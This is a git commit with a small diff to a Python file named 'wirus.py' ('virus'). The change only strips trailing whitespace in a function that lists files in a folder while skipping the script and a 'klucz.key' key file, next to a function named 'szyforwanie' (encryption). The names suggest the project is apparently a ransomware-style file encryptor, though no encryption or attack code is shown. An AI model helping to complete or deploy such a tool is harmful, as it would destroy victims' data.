241aef600906c8a8364dcb97feb165830bad7c33
Paw3l-404 <pawelgorski465@gmail.com>
2025-10-16 18:30:37 +0200

    Naprawione printy i błedy nadpisywania

--- wirus.py
+++ wirus.py
@@ -20,9 +20,9 @@ def wczytaj_pliki(folder_path):
     for file in os.listdir(folder_path):  
         if file in ["wirus.py", "klucz.key"]:  
             continue
-        file_path = os.path.join(folder_path, file) 
-        if os.path.isfile(file_path):  
-            files.append(file) 
+        file_path = os.path.join(folder_path, file)
+        if os.path.isfile(file_path):
+            files.append(file)
     return files
 
 def szyforwanie(folder_path):
